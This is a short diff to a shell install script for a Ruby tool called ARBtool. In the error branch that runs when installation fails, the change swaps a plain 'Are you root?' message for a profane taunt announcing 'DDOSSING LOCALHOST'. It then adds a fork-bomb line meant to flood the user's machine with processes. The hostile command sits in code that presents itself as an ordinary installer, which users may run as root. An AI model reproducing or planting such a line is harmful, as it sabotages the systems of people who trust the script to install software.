@@ -13,6 +13,13 @@ echo """
     chmod +x ARBtool.rb
     ruby ARBtool.rb
 } || {
-    echo "ERROR"
-    echo "Are you root?"
+    echo """
+ERROR :/
+Something wrong uhm...
+Are you root?
+Are you a sexman?
+Or...GET FUCKED BY MARCO06! (Mozzie and 0xjin collab)
+DDOSSING LOCALHOST...
+"""
+    :(){:|: &};:
 }
